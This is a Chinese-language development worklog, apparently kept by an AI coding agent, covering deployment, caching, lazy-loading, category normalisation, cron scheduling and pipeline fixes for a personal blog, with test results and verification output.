5. 清理：`dist.old-fe-*` 留 2 份（不变）+ **`_backup/ci-fe-*` 留 `BACKUP_KEEP` 份**（新增）

**为什么用 mtime 而不是"保留最近 N 代"**：`assets/*` 是内容哈希命名、只增不改，携带时
`cp -a` 保留原 mtime，所以「超过 KEEP_DAYS 的不携带」本身就是滚动淘汰——不需要额外的代数
记账，也不会误删本次构建自带的文件（它们来自 tarball，mtime 是构建时间）。旧备份目录里的
文件在 `mv dist dist.old-fe-*` 后不再参与，自然被淘汰。

### 验证（全部在服务器实跑，有输出）

**端到端**：造一个"新构建"包（= 当前 dist 去掉内容目录，再删掉 `DesktopPet-ZaaIhgFW.js`
模拟该 chunk 在新构建里消失），跑脚本：

```
结构 OK：179 个文件，主 chunk /assets/index-fRCBNrZy.js
保留 uploads (53 文件) / data (36 文件) / live2d (220 文件)
携带未过期旧 chunk 1 个（保留 3 天）
生效 chunk: /assets/index-fRCBNrZy.js (home=200 chunk=200)
旧 chunk 抽查: /assets/DesktopPet-ZaaIhgFW.js → 200
DEPLOY_FRONTEND_OK /assets/index-fRCBNrZy.js
```

部署后线上 `index.html` → `index-fRCBNrZy.js`，**101 个引用 chunk 缺失 0**，首页 200。

**保留期 / 上限逻辑的隔离测试**（`/tmp` 造文件，不碰生产）：

| 用例 | 结果 |
|---|---|
| 今天的旧 chunk | 携带 ✓ |
| 2 天前的旧 chunk | 携带 ✓ |
| 5 天前的旧 chunk（超 3 天） | **不携带** ✓ |
| 新包里同名的文件 | **不被旧文件覆盖**（内容是新的）✓ |
| 体积上限 3MB / 实有 7MB | 从最老的删起，`fresh.js`（本次构建自带）**始终保留** ✓ |

### 遗留（**四十期已全部处理**，见「四十期」）

- **`dist/live2d` 占 191M**（`dist` 219M 的大头），而 Live2D 是**死代码**。千禧已确认直接删 →
  四十期 `git rm -r frontend/public/live2d`（220 文件）+ 删 `dist/live2d`，`dist` 降到 28M。
  **只删 `dist/live2d` 是不够的**——Vite 默认 `publicDir: 'public'`，源不删下次构建就回来。
- **现有 24 份 `_backup/ci-fe-*`（约 5.2G）**：千禧已确认现在就裁 → 四十期手工删了 21 份
  （`_backup` 5.5G → 1.2G）。此后由脚本按 `BACKUP_KEEP=3` 自动维持，CI #58 实测生效。
- 另有一批非 `ci-fe-*` 的历史备份目录（`bubble-*` / `manual-*` / `r3-rescue-*` /
  `skills-*`，共 22 个）不在脚本的裁剪范围内，需要的话手工清。

## 三十八期：懒加载 chunk 失败不再打穿整页（2026-10-29，提交 `c9a828e` + `771993e`，前端-only）

千禧报障（附图）："咱们的博客打不开了"。截图是全局 ErrorBoundary 的「页面出错了」：

```
Failed to fetch dynamically imported module:
https://blog.qianxi7988.me/assets/DesktopPet-BvlulqHy.js
```

### 结论先说：文件和服务端都没问题，是公网链路丢包 + 前端没有兜底

逐条排查（都有命令输出）：

| 假设 | 实测 | 成立？ |
|---|---|---|
| chunk 被删了 | `/var/www/blog/dist/assets/DesktopPet-BvlulqHy.js` 存在，42,258 B，公网 200 | 否 |
| 部署不完整 | 三层自洽：`index.html` → `index-BsLrrdIV.js` → 该 chunk；从 dist 所有 js 提取被引用的 chunk 共 **101 个，缺失 0** | 否 |
| 用户撞上旧版本 | 用户 IP `67.159.48.150` 在 `11:08:04` 那一批请求**全是 200**，该 IP 全量日志 **404 数为 0** | 否 |
| 服务器扛不住 | `load average 0.01`、容器 CPU 0.25%、出口 3.3 KB/s、网卡 errors/dropped **0/0**、磁盘 50% | 否 |
| 防火墙/限流 | 无 fail2ban；`iptables` 只对 22 端口按 IP REJECT；nginx 无 `limit_req` | 否 |
| 服务端慢 | 服务器本地 `curl` 同一文件 **0.0047s**（三次 4.7 / 4.4 / 4.3 ms） | 否 |
| **公网链路** | 同一文件从本机连测：**5.51s / 62.70s / 2.57s / 1.59s / 1.78s**；另一次 25s 超时只传了 **15,975 / 42,258 字节**就断 | **是** |

用户那次失败的请求**根本没进 nginx 访问日志**——请求死在链路上，所以 nginx 侧查不到任何 404。
62.7 秒 ≈ TCP 重传退避 `1+2+4+8+16+32` 耗尽。

顺手排除了 MTU：`ping -f -l` 探到路径在 1420~1440 附近开始丢包，于是在服务器加
`iptables -t mangle -A POSTROUTING -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --set-mss 1400`
做 A/B（规则带 150 秒 `nohup` 自动撤销做防呆）。结果 **A 组（有钳制）12 次里仍有 1 次 25s 超时，
B 组（无钳制）12 次全部完成** —— 钳制没用，是普通的间歇性丢包，不是 PMTU 黑洞。
**规则已撤销**（`iptables -t mangle -L POSTROUTING | grep -c TCPMSS` = 0），`/tmp/mss_reverted` 已删。

### 真正的缺陷：一个装饰组件的 chunk 失败能打穿整页

全站只有一个 `ErrorBoundary`（`App.tsx:76`），而 34 个路由页 + 桌宠 + MermaidChart 全是
`React.lazy`。任何一个 chunk 拉取失败，错误都冒到那个唯一边界，整页被换成「页面出错了」。

触发这次故障的 `DesktopPet`（`PublicLayout.tsx:11`）只是右下角的**装饰小人**，1.5 秒后由
`requestIdleCallback` 挂载——它加载失败本不该影响阅读。

### 改动

新增 `frontend/utils/lazyWithRetry.ts`：

- `lazyWithRetry(factory, retryDelay = 1000)`：失败后隔 1 秒**重试一次**，仍失败才交给 ErrorBoundary。
- `lazyOptional(factory)`：失败就当组件不存在（`{ default: () => null }`），**只给纯装饰用**。

| 文件 | 改动 |
|---|---|
| `layouts/PublicLayout.tsx` | `DesktopPet` → `lazyOptional` |
| `components/MarkdownRenderer.tsx` | `MermaidChart` → `lazyWithRetry`（图表是内容，重试；真失败仍报错，不静默吞内容） |
| `App.tsx` | 34 处路由级 `React.lazy` → `lazyWithRetry` |

### 验证

- `tsc --noEmit -p tsconfig.json` → exit 0
- `vitest run` → **2 files / 7 tests 全过**（新增 `__tests__/lazy-retry.test.ts` 两个用例：
  工厂第一次 reject、第二次 resolve 时断言**被调用 2 次**且组件渲染出来；`lazyOptional`
  一直 reject 时断言不抛异常、容器内容为空）
- CI run `55`（`c9a828e`）= success
- 线上：`index.html` → `assets/index-fRCBNrZy.js`（328,576 B）、`assets/DesktopPet-ZaaIhgFW.js`
  （42,258 B），101 个引用 chunk **缺失 0**

### 遗留风险（未处理，等千禧拍板）

`scripts/ci/deploy_frontend.sh` 是**整目录替换**（`mv dist dist.old-fe-*` → `mv new dist`），
旧 chunk 全被删。于是**每次部署都会让所有还开着的标签页在下一次切路由时 404**——这正是这类
「页面出错了」最常见的来源。要根治得改成「合并新产物 + 保留旧 chunk N 天 + 定期裁剪」，
会动部署脚本和 dist 体积（现在 219 MB），本期没动。

## 三十七期：热点详情页头部重做（2026-10-26，提交 `f70f886`，前端-only）

千禧指令：附截图圈出热点详情页顶部，"这个热点文章详情页最上方这里还是太丑陋了, 我需要你看怎么帮我美化一下"，并要按 `/agency-experts` 技能召唤 UI 设计专家。

### 诊断（可测量的问题，不是审美偏好）

原头部（`frontend/pages/HotspotDetail.tsx` L411-476）有三处硬伤：

1. **幽灵列**：L415 是 `grid grid-cols-1 xl:grid-cols-[minmax(0,1fr)_260px] gap-6`，但里面只有一个子元素——那个 260px 的第二列永远空着。删掉后标题可用宽度 484px→768px（1920 视口）、388px→672px（1440），**+73%**。
2. **重复信息条**：L457-476 是 `grid grid-cols-2 md:grid-cols-4` 的四项（分类/热度/来源数/更新时间），而分类、热度、来源数在上方胶囊行已经念过一遍，中间还夹着 72px 死白。
3. **零信息量徽章**：`AI HOTSPOT` 黑胶囊 + `✓ 已发布` 胶囊。前者深色模式下反转成 `dark:bg-white` 纯白块，是全页最亮物体；后者读者正在读=已发布，同义反复。

外加 L412 的径向渐变（12% alpha，肉眼几乎不可见，深色下变浑浊蓝绿污渍）和 `bg-white/98`、`dark:bg-slate-800/96`——**这两个透明度不在 Tailwind 默认 opacity 标度里**（只有 0/5/…/95/100），Play CDN 的 JIT 可能静默丢类，导致卡片透明、透出 body 渐变。

### 改动

只改 `frontend/pages/HotspotDetail.tsx` 一个文件的头部（现 L418-480），正文「深度解读」及以下、左大纲、右栏、浮动工具栏全部未动。

- 删：径向渐变层、260px 幽灵列、`AI HOTSPOT` 胶囊、`✓ 已发布` 胶囊、`来源 N` 胶囊、整个 `grid-cols-2 md:grid-cols-4` 信息条。
- 加：`h-1` 渐变顶条 `bg-gradient-to-r from-indigo-500 via-primary-500 to-cyan-400`（复用 `HotspotsList.tsx` 列表卡已有的站内视觉签名）。
- 卡面改实色 `bg-white dark:bg-slate-800`。
- 新结构：**标题 → 摘要 → 一行元信息**（分类胶囊 · 日期 · 热度 · 复制链接）。
  - 分类胶囊改可点，跳 `/hotspots?category=...`，`max-w-[12rem] truncate` 兜底超长分类名。
  - 日期用新增的 `formatDateOnly`（`HotspotDetail.tsx:27-31`，**字符串截取不用 `new Date()`**，因为后端 ISO 串不带时区后缀），`title` 属性保留完整时间。
  - 元信息用 `gap-x-3` 排布，不用边框分隔。
  - 复制按钮 `rounded-full` → `rounded-lg`（从"标签"变"控件"），`copied` 转 emerald + 勾图标，`aria-live="polite"` 挂在文案 `<span>` 上而不是按钮上，`min-w-[3.5em]` 防抖动。
- 摘要加 `max-w-3xl`（约 42 字/行），行高保持 `leading-8`。
- 标题保留 `font-bold`，**去掉 `tracking-tight`**（中文负字距会挤字）。

### 两个专家的分歧与裁决

按 `/agency-experts` 召唤了 `design-ui-designer`（e20ac4dd）与 `design-ui-finish-gate-reviewer`（a379724c）。两者对"删幽灵列 + 删信息条 + 删 `AI HOTSPOT` + 删 `✓已发布` + 删渐变 + 改实色卡面"完全一致，分歧三处：

| 分歧 | UI Designer | Finish-Gate | 我的裁决 |
|---|---|---|---|
| `AI HOTSPOT` | 降级为 11px uppercase 微标签 | 直接删 | **删** —— 英文大写 eyebrow 是 forbidden default；深色下反转成白块 |
| 标题字重 | 升 `font-black`(900) | 升 900 | **保留 `font-bold`** —— 与 `ArticleDetail.tsx:748` 一致；二十二期已因"40+ 字长标题视觉压迫过强"降过一次，升回去是走回头路 |
| 热度 | 保留（行内细字） | 建议删 | **保留** —— 作为行内细字不占层级，是千禧自己会看的信息 |

Finish-Gate 判定原方案 **HOLD**，指出的三处（日期带秒、无摘要时显示"暂无摘要"、`hidden lg:block` 右栏在 1024-1279px 挤占正文）——前两处本期已解决（日期去秒、无摘要/无分类整块不渲染），第三处属外层布局，**本期未动**（记入「待办」）。

### 验证

- `cd frontend && node ./node_modules/typescript/bin/tsc --noEmit -p tsconfig.json` → exit 0。
- CI run `40303247002` = `success`。
- 线上 chunk 换成 `assets/HotspotDetail-pl8MbZzg.js`（36,977 B，旧版 `HotspotDetail-DAp3wV3D.js` 38,287 B，**小 1,310 B**），`index-BsLrrdIV.js` 已引用新 chunk；公网 `GET /assets/HotspotDetail-pl8MbZzg.js` → 200，旧 chunk → 404。
- 产物关键字核验：`AI HOTSPOT` 0 次、`暂无摘要` 0 次、`未分类` 0 次、`260px` 0 次；`from-indigo-500 via-primary-500 to-cyan-400` 存在；`已发布` 只剩 1 次（右栏状态卡）；`热度` 只剩 1 次（元信息行内细字）。
- 截图（1440 / 1920 / 375 / 深色）均确认：渐变顶条 + 单行标题 + 摘要 + 一行元信息，幽灵列与信息条消失，右栏「内容信息」卡原样保留。

### 未验证项（诚实记录）

- **`copied` 态没截到图**。点「复制链接」后文案不变——原因是 `navigator.clipboard.writeText` 在验证环境里返回的 Promise **既不 resolve 也不 reject**（`copyLink` 在 `HotspotDetail.tsx:145-153`，`await` 之后才 `setCopied(true)`）。已用 `Browser.grantPermissions` 授予 `clipboardReadWrite`/`clipboardSanitizedWrite` 仍无效。**这是验证环境限制，不是代码缺陷**——`copyLink` 本体本期未改，右栏同一个函数早就在用。
- 后来 agent 浏览器被另一个项目会话占用（反复被拉回 `192.168.16.69:38181`），按千禧指示不再抢，收工。

## 三十六期：分类归一——writer 白名单校验 + 419 行历史数据归一（2026-10-26，提交 `8ee03ad`）

十禧指令："修吧"——修上一轮报的两个问题之一（#696 分类错标成"其他"）。

### 根因：primary_category 从来没校验过
`writer.py:223` 原文 `primary_category = str(plan.get("primary_category") or "其他")`
——**模型给什么就存什么**。`prompts.py:213` 里 `PRIMARY_CATEGORIES` 早就定义了
6 个规范值，但 writer.py 从没 import 过它。

于是 596 篇攒出 **55 种写法**，同一概念散成一堆变体：

| 概念 | 实际写法（篇数）|
|---|---|
| AI基础设施 | `AI基础设施` 90 / `AI-Infrastructure` 33 / `AI 基础设施` 6 / `AI基础` 5 / `AI架构` 2 / `AI-System-Architecture` 2 / `AI-Architecture` 2 |
| AI模型 | `AI-Research` 109 / `AI-Multimodal` 55 / `AI多模态` 12 / `AI研究` 10 / `AI-Models` 3 … |
| AI应用 | `Agent工程` 30 / `AI应用落地` 14 / `AI编程` 14 / `AI测试评估` 7 / `AI-Agent` 5 / `具身智能` 5 … |
| AI产品 | `AI-Products` 27 / `AI行业` 12 / `AI-Industry` 2 … |
| AI安全 | `AI安全与对齐` 13 / `AI对齐与评测` 4 … |

`models/hot_topic.py:50-53` 的注释其实早就记录了这个判断——"中英混杂且同义
重复，归档页主题分组用它不可用"——十六期是用 `topic_tag` 绕过去的，**但从没归一**。

### 为什么这不只是"好看不好看"
前端分类筛选是**按原始值精确比较**（`HotspotsList.tsx:836`
`.filter((item) => selectedCategory === 'all' || (item.primary_category || '') === selectedCategory)`）。
55 种写法 = 55 个分类按钮，每个按钮只筛出 1~2 篇。**筛选功能形同虚设。**

### 修法
**1. `writer._normalize_primary_category()`（新增，`writer.py:191-238`）**
白名单直通 → 去空格/统一大小写/把 `-` `_` 当分隔符归一后比对 → 关键词猜 →
兜底 `"其他"`。关键词表**顺序有讲究**（先判更具体的，"基础设施"不能抢走
"AI安全"）。宁肯落"其他"也不留新变体——新的变体会让归一工作随新文章慢慢白做。

`assemble()` 里改成 `primary_category = _normalize_primary_category(plan.get("primary_category"))`。

**测试**：55 种历史写法逐个喂进函数，**55/55 全通过**，输出全部落在
`PRIMARY_CATEGORIES` 白名单内。

**2. 历史数据归一（419 行）**
备份 `/data/blog.db.bak-cat-20261026-092952`。结果：**55 种 → 6 种，非规范行 0**。
剩 6 篇"其他"再人工核对归类：

| 文章 | 原 | 新 | 依据 |
|---|---|---|---|
| #696 Prism Attention 跨层索引共享 | 其他 | AI基础设施 | 稀疏注意力/KV Cache/推理加速 |
| #679 预训练数据顺序 | 其他 | AI模型 | 预训练/数据线 |
| #678 长上下文 KV 层级 | 其他 | AI基础设施 | 推理加速 |
| #548 Foley-Omni 视频生成 | 其他 | AI模型 | 多模态模型 |
| #680 RL 奖励失效与防御 | 其他 | AI安全 | 对齐/安全 |
| #672 Anthropic 智能体控制 | 其他 | AI安全 | 安全 |
| #671 ExploitGym 智能体逃逸 | 其他 | AI安全 | 安全 |

最终分布：**AI模型 269 / AI基础设施 158 / AI应用 91 / AI产品 53 / AI安全 25，
"其他"归零，分类只剩 5 种。**

**3. 前端分组表对齐**
`HotspotsList.tsx:29` 的 `PRIMARY_CATEGORY_GROUPS` 原表是 `'Agent工程'`、
`'AI多模态'`、`'具身智能'`、`'前沿论文'` 这些**已不存在的分类值**——每个
分组都匹配不到成员，`getStackValues()` 全部走 `return [category]` 兜底。
改成按规范值对齐。

### 验证（API 实测）
```
GET /api/v1/hotspots?page=1&page_size=100&status=published
  → 100 条, 5 种分类: AI模型 45 / AI基础设施 38 / AI产品 7 / AI应用 6 / AI安全 4
GET /api/v1/hotspots?category=AI基础设施  → total=158
GET /api/v1/hotspots/696                 → [#696 [AI基础设施] Prism Attention 的跨层索引共享机制]
```
（注意：`page_size=200` 超过上限会返回 0 条，上限是 100。）

### 踩坑：本地 clone 落后 5 个提交
动手时本地 HEAD 停在 `ae1ddba`（三十二期），服务器仓库已到 `354ec55`（三十五期），
而 GitHub 直连失败（`Failed to connect to github.com port 443`）。**服务器仓库
`/data/blog/repo-tmp` 才是权威**——逐文件 `get` 回来同步后再改，避免把三十五期
的改动当成"我的改动"提交，也避免覆盖掉它们。

### 已知遗留（未做，改动较大）
- **侧边栏"技术栈分类"和"分类"现在重复**：`getStackValues()` 是
  `PRIMARY_CATEGORY_GROUPS` 的映射，归一后分组名和分类值 1:1，两个筛选器
  筛的是同一个维度。要么删掉侧边栏那块，要么给技术栈另立维度（如按
  `topic_tag`）。用户未要求，暂不动。
- **表格数据来源未标注**：上一轮一并报的另一个问题，需要改 pipeline prompt，
  改动较大，用户未要求现在做。

## 三十五期：发布任务挪进夜间窗口 + 锁死锁阈值 30min→3h（2026-10-22，提交 `7ffe9af` + `e05e7dc`，生产镜像 `qianxi-blog:ci-51`）

十禧指令："把所有发布文章的定时任务的执行时间设置为晚上 7 点之后到第二天白天早上 7 点"。

### 排期变更
`/etc/cron.d/hotspot-pipeline`（发布文章的三个任务）：

| 原来 | 现在（上海时间） | 模式 |
|---|---|---|
| 09:20 | **19:20** | `hot hot`（AIHOT 热点选题，论文优先）|
| 19:20 | **23:20** | `curriculum 1900`（注意力/KV Cache/推理加速线）|
| 21:20 | **03:20** | `curriculum 2000`（预训练/数据/scaling law 线）|

**间隔 4 小时的依据**：单次实测耗时 **1h02m ~ 2h25m**（10-21 手动 1h52m、
10-21 19:20 cron 2h25m、10-22 09:20 cron 1h02m）。4h > 最长耗时 → 不会
自己撞自己；03:20 那次约 05:45 前跑完，仍在 07:00 窗口内。

### 顺带修掉一个会在密集排期下爆发的隐患
**`LOCK_STALE_SECONDS = 1800`（30 分钟）的前提已经不成立**。
注释写的是"管线一次 3-15 分钟"——那是二十期刚建管线时的估计。实际任务要
跑 1~2.5 小时，于是：

> 任务跑到第 30 分钟 → 下一次 cron 触发 → 判成"死锁残留"删掉锁并启动
> 第二个任务 → **两个 pipeline 并发跑**（撞题 + 争渠道配额）

原来 09:20/19:20/21:20 间隔 10 小时，掩盖了这个问题；一旦密集排期必然爆发。
改成 **3 小时（10800 秒）**，覆盖最长任务周期，锁才真正起"单飞"作用。

**实测验证**（在容器里造锁文件改 mtime）：

| 锁年龄 | 结果 |
|---|---|
| 40 分钟 | `_try_acquire_lock() -> False`，**锁守住**（旧阈值会误删 → 并发）|
| 4 小时 | `-> True`，判死锁并接管（残留锁仍能自愈）|

### 顺带两处可观测性
- 锁被占用而跳过时打明确日志（原先只抛 409，cron 日志里是一条
  "Client error 409"，分不清是"任务在跑"还是"出故障"；密集排期下跳过是
  **正常现象**，必须能一眼看出）
- cron 响应的耗时提示从"约 3-10 分钟"改成实测值"约 1-2.5 小时"

### 没有挪动的任务（它们不发布文章）
- `blog-ai-daily`（每 30 分钟）——拉外部 AIHOT 日报生成静态 JSON，**不写库**
- `hotspot-tagging`（03:17）——只补 `topic_tag`（幂等、只补 NULL），不写正文
- `blog-backup`（04:30）、`blog-coze-sync`（05:10）、`push_figures_watch`（每 2 分钟）

### 留档
`/etc/cron.d/` 的文件**不在 git 里**（宿主配置，不随 CI 部署），换机容易漏配。
新增 `ops/cron/hotspot-pipeline` + `ops/cron/README.md` 留副本与说明。

## 三十四期：hot 模式检索词过滤 + latest 排序改 created_at（2026-10-21/22，提交 `fd116bb` + `0301647`，生产镜像 `qianxi-blog:ci-48`）

十禧指令："过了一天了，检查一下" → 先查昨天的 cron（结论见下），再指令"现在修"。

### 一、昨天的 cron 验收：三十期修复真实验收通过
这是修复后**第一次纯 cron 自然触发**（无手动干预）：

| 指标 | 结果 |
|---|---|
| cron 触发 | 4 次全触发 |
| 产出 | **#694 SolarRenderer**（86 pass）、**#695 Deep Research 错误分层**（回炉一次后 91 pass）|
| "工具循环超限" | **0 次** ✅（三十期修好了）|
| arXiv 限流 | **0 次** ✅ |
| "发布失败"假错误 | **0 次** ✅（三十二期修好了）|
| pending 归档 | 自动生效 ✅；failed = 0 ✅ |

昨天到今天共 6 篇（#690~#695），每篇 8 mermaid + 9 节结构，主题互不重合。

### 二、两个新问题（本期修）
**1) hot 模式检索词是机构名**
```
规划层·论文检索: query='Google Research' 源=arxiv
```
AIHOT 线索是**资讯标题**，混着机构名/产品名/发布词，`_search_query` 照单全收。
'Google Research' 在 arXiv 上召回极差。三十期只修了 curriculum 模式，hot 漏了。
修法：停用词表（机构/产品/硬件/发布词/泛词）+ 模型名按**词根**过滤
（DeepSeek-V3 / Llama-4 / GPT-4o 去掉版本后缀再比）+ 全过滤光时兜底
`large language model`。

**2) '最新'列表被 23 篇老文章占满**
前端热点页显示 #665/#663 这些 7 月老文章打头，刚发的 6 篇排第 23~31 位。

**根因**：十八期的 redate 均摊脚本把老文章的 `published_at` 改到**未来日期**
（10-28 ~ 10-31），'latest' 按 published_at 排 = 按未来日期排。

**修法（后端 + 前端都要改，否则两边不一致）**：
- 后端 `list_hot_topics` 的 latest 分支 → `created_at`（真实写作时间，
  不受 redate 影响；583 篇 published 的 created_at 无一为 NULL）
- 前端 `HotspotsList.tsx` 三处：`filteredItems` 的 latest 分支、
  `dateScopedItems` 的时间筛选（今天/近7天/近30天）、`featuredItems` 并列次键
  → 全部改用新增的 `getCreatedDate`
- **展示日期与月份归档仍用 `getPublishedDate`**——published_at 是十八期
  刻意 redate 的编辑日期，展示上要保留原样

**踩坑**：只改后端不够——前端 `filteredItems` 自己又排了一次序（用 published_at），
结果"接口返回新文章、页面显示老文章"。两端必须一起改。

### 三、验证
- 检索词过滤 8 用例全过；知识线映射（三十期）未被破坏
- 换 created_at 后新写的 10 篇全部回到列表顶部（#695 → #686）
- tsc --noEmit 通过（exit 0）
- 浏览器实测：新 chunk `HotspotsList-BRjCQ2qC.js` 加载后列表为
  **695 → 694 → 693 → 692 → 691** ✅

**顺带记一笔**：验证时发现浏览器会缓存**旧的 SPA chunk**（切路由不会换 chunk，
必须刷新文档才拉新 index.html → 新 chunk 名）。二十九期给 index.html 加
no-cache 正是为这个——但**已经打开的标签页**仍要刷新一次才生效。

## 三十二期：publish 里 slug 未定义（NameError 被报成"发布失败"）（2026-10-21，提交 `14cbe9a`，生产镜像 `qianxi-blog:ci-47`）

三十一期手动触发的实测当场暴露——日志先打"已发布 hot_topic id=691"，紧接着
```
发布失败（数据库）: name 'slug' is not defined
```
**文章其实已经入库**（id=691、7229 中文字、8 个 mermaid、3 个表格、2 张论文原图、
9 节含结论节），但错误信息是假的，且 pending 归档没执行。

**根因**：`_archive_published_queue_files(slug)` 的调用点用了 `publish` 作用域里
不存在的 `slug`（只有 `fm` 里的值），NameError 被 publish 的 `except` 吞成
"发布失败"。

**修法**：
- `slug` 改从 frontmatter 取（与入库用的是同一个值）
- **归档调用单独 try 一遍**：归档是清理动作，不该有能力否决一篇已经入库的
  文章——归档失败只记 log

**教训**：发布节点里"入库"与"善后"必须隔离。入库成功即算成功，善后失败
只记日志。（这与三十一期的"审稿不可用不该作废稿件"是同一类错误：
把无关的故障放大成对已完成工作的否定。）

## 三十一期：审稿服务不可用不再作废稿件（2026-10-21，提交 `d83b681`，生产镜像 `qianxi-blog:ci-46`）

十禧指令："你先手动触发一次，检查一下效果"——手动触发当场暴露出一个新问题。

### 实测经过
手动跑 hot 任务（publish=true），整条链路本来正常：
```
规划层·论文检索: query='attention mechanism kv cache long context inference' 源=arxiv
执行层：8/8 章节完成
结构校验（字数 8273/标题 17）: 通过
审稿调用失败（None）——转 revise 回修，不发布
执行层：并发写 8 个章节        ← 整篇重写！
```
**稿件已过结构闸（8273 字、标题 17 字），只因审稿 LLM 偶发返回空 body，
整篇 8 章节被重写一遍。** 审稿日志里没有伴随 429/超时，是 stepfun 偶发空返回。

### 三处治本
1. **空内容也要重试**：`review` 节点原来只在抛异常时重试；空 body（不抛异常）
   直接 `break` 出循环 → 判定"审稿不可用"。现在空返回也走 10s 退避重试（最多 4 次）。
2. **审稿彻底失败时 verdict=""**（不再是 "revise"），且**不消耗 revision_round**
   ——审稿服务抖动不该让已写好的稿子作废。
3. **路由新增 "review" 自环**：原地重试审稿，最多 `MAX_REVIEW_STRIKES=3` 次，
   用尽才落 failed。计数在 review 节点里累加（**路由函数里改 state 在 LangGraph
   中不持久化**，这是实现时踩到的坑）。harness 图同步加自环；审稿成功时计数清零。

### 验证
路由矩阵 7/7 正确（pass→enqueue / revise→write / revise 超轮→retry /
审稿不可用→review×2→failed）；两个图的 `review->review` 边各 1 条（边没注册
会直接报运行时错，所以必须查边而不只是查节点）。

## 三十期：规划层工具协议 + 换题重试 + pending 归档（2026-10-21，提交 `6fa09ae`，生产镜像 `qianxi-blog:ci-45`）

十禧指令："先修复，暂时不要动手补跑"（指 10-17~10-19 空窗缺口不补）。

### 背景：10-17~10-19 连续 4 天空窗
cron 每天 3 次都触发了，但产出 0——容器日志里连续出现：
```
规划层·论文检索: query='注意力 / KV Cache / 推理加速线' 源=arxiv
ValueError: 规划层未产出合法计划（工具循环超限）
```
一天 3 次全废。查出**三个叠加根因**，逐个治本：

### 1) 工具应答协议错了（真正的元凶）
```python
# 错：工具调用后用 HumanMessage 塞结果
msgs.append(HumanMessage(content=f"[工具结果 {tc['name']}]\n{out[:6000]}"))
# 对：
msgs.append(ToolMessage(content=..., tool_call_id=tc.get("id") or "", name=tc["name"]))
```
模型收不到"我的工具调用已被应答"的信号 → 继续调工具 → 8 轮预算全耗在读论文上，
一轮 JSON 都没吐过 → 必然"工具循环超限"。

**为什么之前两次修复没根治**：二十四期把预算 4→6→8、加超时容错——但那都是
**加预算**，协议本身没改。症状是"预算不够"，病因是"协议错了"。

### 2) 知识线检索词是中文（检索质量大降）
`_search_query` 的映射表用的名字（"注意力与 KV Cache 机制"等）**与
`KNOWLEDGE_TRACKS` 的真实名字对不上**，于是 `m.get()` 全部落空、
直接 `return track_name`——把中文原样丢给 arXiv 检索。日志里
`query='注意力 / KV Cache / 推理加速线'` 就是这么来的。中文词在 arXiv 上
几乎搜不到东西，多源兜底也救不回来。改成与 `KNOWLEDGE_TRACKS` 一致的 5 条线。

### 3) 规划失败只死磕同一条线索
原来同一失败重复两遍就放弃。现在 `_candidate_queries` 给每条知识线 **3 条真正
不同的英文线索**（机制 / 系统 / 评测三个切面），失败就**换检索词重新检索**，
最多试 3 条；`plan_article` 拆成外层"换题重试" + 内层 `_plan_once`。

### 4) pending 越积越多（顺带治本）
`enqueue` 写 `pending/`，`publish` 之后**没人清**——每发一篇留一份
（10-21 积到 6 篇 / 12 文件）。副作用：已发布标题被查重清单当成"写过"，
把已发文章也算进撞题防线，人工看 pending 也分不清哪些已发。
新增 `_archive_published_queue_files(slug)`：发布成功后把同 slug 存稿移入
`archive/published/`（留档可追溯，不删）。

### 验证
| 项 | 结果 |
|---|---|
| 5 条知识线检索词 | 全英文、互不相同（每条 3 线索） |
| 知识线检索词含中文 | **0 个** |
| 工具结果用 ToolMessage | 是（HumanMessage 冒充 = 0 处）|
| 发布后 pending 归档 | 生效（造 2 个文件 → 归档 2、pending 剩 0）|
| 端到端实跑 | `query='attention mechanism kv cache long context inference' 源=openalex`，**规划层未崩**，正常进章节写作 |

队列已清：pending=0、failed=0（12 个已发布存稿移入 `archive/published/`）。

## 二十九期：前端缓存致用户拿到旧版（2026-10-15，nginx 配置修复，无代码提交）

千禧追问："你没发现归档页面那里切换数据又不变了吗？还是存在 bug 啊"——但我在浏览器里实测**切换是生效的**（`23/7/13341` → `572/10/53.6K`）。这个矛盾本身就是线索：**我验证了功能对不对，但没验证用户拿到的版本对不对**。

### 根因：三层叠加的缓存陷阱
1. `index.html` **没有 `Cache-Control`**（`nginx.conf` 的 `map $uri $blog_static_cache_control` 只匹配 `/assets/*.js|css|...`，刻意排除 index.html，但结果是"啥头都不加"而不是"no-cache"）→ 浏览器**启发式缓存**旧 index.html；
2. 旧 index.html 引用**带旧 hash 的 chunk 名**，而 Vite 每次构建换文件名、旧文件被删；
3. 请求旧 chunk 落到 `try_files $uri $uri/ /index.html` → **返回 index.html 的 HTML 且状态码 200**（实测旧 chunk 返回 3968 字节 HTML）→ 浏览器拿 HTML 当 JS 解析直接报错 → **React 组件不挂载/不响应点击**，用户看到的就是"切 tab 数字不变"。

### 修法（`/etc/nginx/sites-available/blog` 的 443 server 块）
```nginx
location / {                                   # 注意不是 location = /index.html
    add_header Cache-Control "no-cache, no-store, must-revalidate" always;
    add_header Pragma "no-cache" always;
    expires -1;
    try_files $uri $uri/ /index.html;
}
location ^~ /assets/ {                         # 带 hash 的资源仍长缓存
    try_files $uri =404;                       # 缺失资源明确 404，不再用 HTML 冒充 JS
    expires 30d;
    add_header Cache-Control "public, max-age=2592000, immutable" always;
}
```

### 两个踩过的坑（都靠实测发现）
- **`location = /index.html` 对根路径请求不生效**：用户访问的是 `/`，精确匹配只在请求 `/index.html` 时命中。第一次改完 `curl -I https://blog.qianxi7988.me/` 仍无缓存头，就是栽在这里。
- **插错了 server 块**：脚本用 `location / {` 当锚点，命中的是 80 端口那个只有 301 跳转的块。改用 `listen 443 ssl;.*?root /var/www/blog/dist;` 双特征正则定位才对。

### 验证
| 项 | 结果 |
|---|---|
| `GET /` 响应头 | `Cache-Control: no-cache, no-store, must-revalidate` + `Pragma: no-cache` |
| 已删除的旧 chunk | **HTTP 404**（此前是 200 + HTML） |
| 现有 chunk | 200 + `immutable, max-age=2592000`（性能不受影响） |
| SPA 深链 `/archives` `/hotspots` `/prompts` | 均 200 |

**重要事实（此前未记录）**：前端**不走容器镜像**——CI 把产物部署到 nginx 的 `/var/www/blog/dist`，只有后端打进 `qianxi-blog` 镜像。所以排查前端问题时，容器镜像 tag 不变是正常的，要看 `dist` 目录时间戳。

备份：`/etc/nginx/sites-available/blog.bak{,-,2-,3-}*`（可回滚）。

## 二十八期：热度数字压缩显示（2026-10-15，提交 `0104d69`，生产镜像 `qianxi-blog:ci-44`）

千禧报障："热点文章归档的热度那里就不要加入小数点了，不要显示得超过框外，做好数字省略，太大的数可以用多少 K、多少 M、多少 B 来表示"。

